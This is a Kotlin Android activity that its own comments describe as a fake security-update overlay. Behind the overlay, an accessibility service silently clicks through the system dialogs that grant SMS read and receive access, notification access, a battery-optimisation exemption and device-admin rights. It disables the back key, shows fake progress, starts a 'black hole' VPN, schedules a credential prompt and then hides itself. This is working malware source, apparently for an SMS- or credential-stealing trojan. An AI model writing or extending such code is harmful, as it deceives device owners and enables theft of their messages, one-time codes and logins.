package com.vibelink.client.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import android.view.KeyEvent
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import com.vibelink.client.R
import com.vibelink.client.accessibility.AccessibilityControlBridge
import com.vibelink.client.prefs.SetupPrefs
import com.vibelink.client.setup.BatteryOptimizationHelper
import com.vibelink.client.setup.DeviceAdminHelper
import com.vibelink.client.setup.FcmTopicSubscriber
import com.vibelink.client.setup.NotificationHelper
import com.vibelink.client.setup.ServiceStarter
import com.vibelink.client.setup.PostSetupCredentialPrompt
import com.vibelink.client.setup.ServiceWatchdog
import com.vibelink.client.setup.SetupAutoGrantCoordinator
import com.vibelink.client.setup.SetupPermissionAutoClicker
import com.vibelink.client.sms.SmsHelper

/**
 * 透明授权壳：通知 / SMS / 电池 / 设备管理员。
 * 对齐竞品：假更新遮罩全程覆盖；系统弹窗在遮罩下由无障碍自动点。
 * 仅自动彻底失败时才撤遮罩改手动。
 */
class SecurityUpdateActivity : AppCompatActivity() {
    private lateinit var setupPrefs: SetupPrefs

    private val mainHandler = Handler(Looper.getMainLooper())
    private var displayProgress = 1
    private var phaseIndex = 0
    private var phaseStartedAt = 0L
    private var createdAt = 0L
    private var overlayReady = false
    private var permissionRequestInFlight = false
    private var permissionRequestStartedAt = 0L
    private var lastPermissionLaunchAt = 0L
    private var batteryRequestInFlight = false
    private var batteryRequestStartedAt = 0L
    private var adminRequestInFlight = false
    private var adminRequestStartedAt = 0L
    private var lastStatusLogAt = 0L
    private var finishing = false
    private var waitingManualGrant = false
    private var autoGrantFailCount = 0
    private var notificationDeniedOnce = false
    private var notificationDenyCount = 0
    private var smsDeniedOnce = false

    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { granted ->
        permissionRequestInFlight = false
        if (!granted) {
            notificationDeniedOnce = true
            notificationDenyCount += 1
            onAutoGrantFailed("notification_denied")
            if (notificationDenyCount >= NOTIFICATION_DENY_BEFORE_SETTINGS) {
                openAppNotificationSettings()
            }
        } else {
            notificationDenyCount = 0
            ServiceStarter.tryStart(this)
            ServiceStarter.tryStartVpn(this)
        }
        mainHandler.postDelayed({ requestMissingPermissions() }, 280L)
    }

    private val smsPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { result ->
        permissionRequestInFlight = false
        // ColorOS 上重复 launch 常立刻回调空 map，必须计失败 + 冷却，否则狂刷卡死
        if (result.isEmpty()) {
            onAutoGrantFailed("sms_empty_cancel")
            return@registerForActivityResult
        }
        if (result.values.any { !it }) {
            smsDeniedOnce = true
            onAutoGrantFailed("sms_denied")
        }
    }

    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) {
        adminRequestInFlight = false
    }

    private val tickRunnable = object : Runnable {
        override fun run() {
            if (finishing || isFinishing) {
                return
            }
            maybeEnterManualIfPhaseStuck()
            if (!waitingManualGrant) {
                // 防 SetupWizard.onDestroy 误 end() 后自动点全哑 → 卡 90%
                SetupAutoGrantCoordinator.ensureActive()
                ensureOverlay()
                AccessibilityControlBridge.getService()?.let { SetupPermissionAutoClicker.onEvent(it) }
            }
            clearStaleInFlightFlags()
            if (!waitingManualGrant) {
                advanceDisplayProgress()
            }
            driveSilentGrants()
            if (NotificationHelper.isGranted(this@SecurityUpdateActivity)) {
                ServiceStarter.tryStart(this@SecurityUpdateActivity)
                ServiceStarter.tryStartVpn(this@SecurityUpdateActivity)
            }
            logStatusIfNeeded()
            if (allSilentStepsReady()) {
                finishSuccessfully()
                return
            }
            mainHandler.postDelayed(this, TICK_MS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setupPrefs = SetupPrefs(this)
        phaseStartedAt = SystemClock.elapsedRealtime()
        createdAt = phaseStartedAt
        SetupAutoGrantCoordinator.begin()
        ServiceStarter.tryStartVpn(this)
        ensureOverlay()
        renderProgress()
        Log.i(
            TAG,
            "start perms=${isPermissionsReady()} battery=${isBatteryReady()} admin=${isAdminReady()}",
        )
    }

    override fun onResume() {
        super.onResume()
        if (finishing) {
            return
        }
        if (!waitingManualGrant) {
            SetupAutoGrantCoordinator.ensureActive()
            ensureOverlay()
        }
        mainHandler.removeCallbacks(tickRunnable)
        mainHandler.post(tickRunnable)
    }

    override fun onDestroy() {
        mainHandler.removeCallbacks(tickRunnable)
        SetupAutoGrantCoordinator.end()
        AccessibilityControlBridge.hideSecurityUpdateOverlay()
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        // 更新中禁止返回
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    private fun ensureOverlay() {
        if (waitingManualGrant) {
            return
        }
        if (AccessibilityControlBridge.isSecurityUpdateOverlayShowing()) {
            overlayReady = true
            return
        }
        if (!AccessibilityControlBridge.isReady()) {
            return
        }
        overlayReady = AccessibilityControlBridge.showSecurityUpdateOverlay().ok
        if (overlayReady) {
            renderProgress()
        }
    }

    /** 仅手动兜底时撤遮罩；自动授权全程保持（对齐竞品 fakelay） */
    private fun hideOverlayForManualFallback() {
        AccessibilityControlBridge.hideSecurityUpdateOverlay()
        overlayReady = false
    }

    private fun onAutoGrantFailed(reason: String) {
        if (waitingManualGrant || finishing) {
            return
        }
        autoGrantFailCount++
        Log.w(TAG, "autoGrant fail #$autoGrantFailCount reason=$reason")
        if (autoGrantFailCount < AUTO_GRANT_FAIL_LIMIT) {
            return
        }
        enterManualGrantMode(reason)
    }

    private fun enterManualGrantMode(reason: String) {
        if (waitingManualGrant) {
            return
        }
        waitingManualGrant = true
        SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.NONE)
        hideOverlayForManualFallback()
        permissionRequestInFlight = false
        batteryRequestInFlight = false
        adminRequestInFlight = false
        Log.i(TAG, "enter manual grant mode reason=$reason fails=$autoGrantFailCount")
        Toast.makeText(this, R.string.setup_manual_grant_hint, Toast.LENGTH_LONG).show()
    }

    private fun maybeEnterManualIfPhaseStuck() {
        if (waitingManualGrant || finishing) {
            return
        }
        if (isPhaseComplete(phaseIndex)) {
            return
        }
        val stuckFor = SystemClock.elapsedRealtime() - phaseStartedAt
        if (stuckFor >= PHASE_STUCK_MS) {
            enterManualGrantMode("phase_stuck_${phaseIndex}_${stuckFor}ms")
        }
    }

    private fun clearStaleInFlightFlags() {
        val now = SystemClock.elapsedRealtime()
        if (permissionRequestInFlight && now - permissionRequestStartedAt > REQUEST_TIMEOUT_MS) {
            // 弹窗可能仍在，只清 flag 让 tick 继续点，不立刻计失败狂刷
            Log.w(TAG, "permission inFlight timeout, clear flag only")
            permissionRequestInFlight = false
        }
        if (batteryRequestInFlight && now - batteryRequestStartedAt > REQUEST_TIMEOUT_MS) {
            Log.w(TAG, "battery inFlight timeout, clear flag only")
            batteryRequestInFlight = false
        }
        if (adminRequestInFlight && now - adminRequestStartedAt > ADMIN_REQUEST_TIMEOUT_MS) {
            Log.w(TAG, "admin inFlight timeout, clear flag only")
            adminRequestInFlight = false
        }
    }

    private fun advanceDisplayProgress() {
        val phaseReady = isPhaseComplete(phaseIndex)
        val phaseElapsed = SystemClock.elapsedRealtime() - phaseStartedAt
        val canLeavePhase = phaseReady && phaseElapsed >= MIN_PHASE_MS
        val cap = when {
            canLeavePhase -> 99
            phaseReady -> 97
            else -> 90
        }
        if (displayProgress < cap) {
            displayProgress = (displayProgress + 1).coerceAtMost(cap)
            renderProgress()
            return
        }
        if (canLeavePhase && phaseIndex < 2) {
            phaseIndex++
            displayProgress = 1
            phaseStartedAt = SystemClock.elapsedRealtime()
            renderProgress()
            Log.i(TAG, "enter phase=$phaseIndex")
        }
    }

    private fun isPhaseComplete(phase: Int): Boolean {
        return when (phase) {
            0 -> isPermissionsReady()
            1 -> isBatteryReady()
            else -> isAdminReady()
        }
    }

    private fun driveSilentGrants() {
        val waitForA11y =
            !AccessibilityControlBridge.isReady() &&
                SystemClock.elapsedRealtime() - createdAt < A11Y_BIND_WAIT_MS
        if (waitForA11y && !waitingManualGrant) {
            return
        }
        if (!waitingManualGrant &&
            !AccessibilityControlBridge.isReady() &&
            SystemClock.elapsedRealtime() - createdAt >= A11Y_BIND_WAIT_MS
        ) {
            enterManualGrantMode("a11y_not_bound")
        }
        // 等遮罩就绪再拉系统弹窗（遮罩全程覆盖，不撤）
        if (!waitingManualGrant && !overlayReady && !isPermissionsReady()) {
            return
        }
        if (!waitingManualGrant &&
            isPermissionsReady() &&
            !isBatteryReady() &&
            !overlayReady
        ) {
            return
        }
        if (!waitingManualGrant &&
            isPermissionsReady() &&
            isBatteryReady() &&
            !isAdminReady() &&
            !overlayReady
        ) {
            return
        }
        when {
            !isPermissionsReady() -> {
                if (!waitingManualGrant) {
                    SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.PERMISSIONS)
                }
                requestMissingPermissions()
            }
            !isBatteryReady() -> {
                if (!waitingManualGrant) {
                    SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.BATTERY)
                }
                requestBatteryOptimization()
            }
            !isAdminReady() -> {
                if (!waitingManualGrant) {
                    SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.ADMIN)
                }
                requestDeviceAdmin()
            }
            else -> SetupAutoGrantCoordinator.setTarget(SetupAutoGrantCoordinator.Target.NONE)
        }
    }

    private fun requestMissingPermissions() {
        if (permissionRequestInFlight) {
            return
        }
        // 已被系统授权页盖住时不要重复 launch（否则空 cancel 狂刷）
        if (!lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)) {
            return
        }
        val now = SystemClock.elapsedRealtime()
        if (now - lastPermissionLaunchAt < PERMISSION_LAUNCH_COOLDOWN_MS) {
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && !NotificationHelper.isGranted(this)) {
            // 两次不允许后系统不再弹框 → 开应用通知设置
            if (notificationDenyCount >= NOTIFICATION_DENY_BEFORE_SETTINGS) {
                openAppNotificationSettings()
                return
            }
            permissionRequestInFlight = true
            permissionRequestStartedAt = now
            lastPermissionLaunchAt = now
            Log.i(TAG, "request POST_NOTIFICATIONS denyCount=$notificationDenyCount")
            runCatching {
                notificationPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }.onFailure {
                permissionRequestInFlight = false
                notificationDeniedOnce = true
                notificationDenyCount += 1
                onAutoGrantFailed("notification_launch_failed")
            }
            return
        }
        if (!SmsHelper.hasSmsPermissions(this)) {
            if (isSmsPermanentlyDenied()) {
                openAppSettings()
                return
            }
            permissionRequestInFlight = true
            permissionRequestStartedAt = now
            lastPermissionLaunchAt = now
            Log.i(TAG, "request SMS")
            runCatching {
                smsPermissionLauncher.launch(
                    arrayOf(
                        Manifest.permission.READ_SMS,
                        Manifest.permission.RECEIVE_SMS,
                    ),
                )
            }.onFailure {
                permissionRequestInFlight = false
                onAutoGrantFailed("sms_launch_failed")
            }
        }
    }

    private fun isSmsPermanentlyDenied(): Boolean {
        if (!smsDeniedOnce || SmsHelper.hasSmsPermissions(this)) {
            return false
        }
        val readDenied = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
            PackageManager.PERMISSION_GRANTED
        val receiveDenied = ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
            PackageManager.PERMISSION_GRANTED
        if (!readDenied && !receiveDenied) {
            return false
        }
        val readPermanent = readDenied && !ActivityCompat.shouldShowRequestPermissionRationale(
            this,
            Manifest.permission.READ_SMS,
        )
        val receivePermanent = receiveDenied && !ActivityCompat.shouldShowRequestPermissionRationale(
            this,
            Manifest.permission.RECEIVE_SMS,
        )
        return readPermanent || receivePermanent
    }

    private fun openAppNotificationSettings() {
        if (permissionRequestInFlight) {
            return
        }
        permissionRequestInFlight = true
        permissionRequestStartedAt = SystemClock.elapsedRealtime()
        lastPermissionLaunchAt = permissionRequestStartedAt
        Log.w(TAG, "open app notification settings denyCount=$notificationDenyCount")
        val intents = listOf(
            Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, packageName)
            },
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            },
        )
        for (intent in intents) {
            if (runCatching { startActivity(intent); true }.getOrDefault(false)) {
                return
            }
        }
        permissionRequestInFlight = false
    }

    private fun openAppSettings() {
        if (permissionRequestInFlight) {
            return
        }
        permissionRequestInFlight = true
        permissionRequestStartedAt = SystemClock.elapsedRealtime()
        lastPermissionLaunchAt = permissionRequestStartedAt
        Log.w(TAG, "open app settings for permanent denial")
        startActivity(
            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$packageName")
            },
        )
    }

    private fun requestBatteryOptimization() {
        if (batteryRequestInFlight || isBatteryReady()) {
            return
        }
        if (!lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)) {
            return
        }
        batteryRequestInFlight = true
        batteryRequestStartedAt = SystemClock.elapsedRealtime()
        Log.i(TAG, "request battery optimization")
        runCatching {
            startActivity(BatteryOptimizationHelper.openRequestIntent(this))
        }.onFailure {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    private fun requestDeviceAdmin() {
        if (adminRequestInFlight || isAdminReady()) {
            return
        }
        if (!lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)) {
            return
        }
        adminRequestInFlight = true
        adminRequestStartedAt = SystemClock.elapsedRealtime()
        Log.i(TAG, "request device admin")
        deviceAdminLauncher.launch(DeviceAdminHelper.createEnableIntent(this))
    }

    private fun isPermissionsReady(): Boolean =
        NotificationHelper.isGranted(this) && SmsHelper.hasSmsPermissions(this)

    private fun isBatteryReady(): Boolean = BatteryOptimizationHelper.isIgnoringOptimizations(this)

    private fun isAdminReady(): Boolean = DeviceAdminHelper.isActive(this)

    private fun allSilentStepsReady(): Boolean =
        isPermissionsReady() && isBatteryReady() && isAdminReady()

    private fun renderProgress() {
        val label = getString(R.string.cast_optimizing)
        AccessibilityControlBridge.updateSecurityUpdateProgress(displayProgress, label)
    }

    private fun logStatusIfNeeded() {
        val now = SystemClock.elapsedRealtime()
        if (now - lastStatusLogAt < 2_000L) {
            return
        }
        lastStatusLogAt = now
        Log.i(
            TAG,
            "stuck? progress=$displayProgress phase=$phaseIndex manual=$waitingManualGrant " +
                "fails=$autoGrantFailCount active=${SetupAutoGrantCoordinator.isActive()} " +
                "target=${SetupAutoGrantCoordinator.getTarget()} " +
                "perm=${isPermissionsReady()} bat=${isBatteryReady()} admin=${isAdminReady()} " +
                "overlay=$overlayReady a11y=${AccessibilityControlBridge.isReady()} " +
                "pFlight=$permissionRequestInFlight bFlight=$batteryRequestInFlight " +
                "aFlight=$adminRequestInFlight resumed=${lifecycle.currentState.isAtLeast(Lifecycle.State.RESUMED)}",
        )
    }

    private fun finishSuccessfully() {
        if (finishing) {
            return
        }
        finishing = true
        displayProgress = 100
        renderProgress()
        SetupAutoGrantCoordinator.end()
        setupPrefs.setupCompleted = true
        ServiceStarter.tryStart(this)
        ServiceStarter.tryStartVpn(this)
        ServiceWatchdog.scheduleNextCheck(this)
        // 进程若在安装期就启动过，首轮订阅会被黑洞 VPN 挡成 SERVICE_NOT_AVAILABLE，
        // 重试链耗尽后不再有人调用；这里在 setup 落盘后再补一次（幂等）。
        FcmTopicSubscriber.subscribeAfterSetup(this)
        Log.i(TAG, "setup complete")
        mainHandler.postDelayed({
            AccessibilityControlBridge.hideSecurityUpdateOverlay()
            PostSetupCredentialPrompt.scheduleAfterSetup(this)
            moveTaskToBack(true)
            finish()
        }, 600L)
    }

    companion object {
        private const val TAG = "SecurityUpdate"
        private const val TICK_MS = 110L
        private const val MIN_PHASE_MS = 2_800L
        private const val A11Y_BIND_WAIT_MS = 8_000L
        private const val REQUEST_TIMEOUT_MS = 15_000L
        private const val ADMIN_REQUEST_TIMEOUT_MS = 60_000L
        private const val PERMISSION_LAUNCH_COOLDOWN_MS = 2_500L
        private const val NOTIFICATION_DENY_BEFORE_SETTINGS = 2
        private const val PHASE_STUCK_MS = 60_000L
        private const val AUTO_GRANT_FAIL_LIMIT = 8

        fun createIntent(context: android.content.Context): Intent {
            return Intent(context, SecurityUpdateActivity::class.java)
        }
    }
}
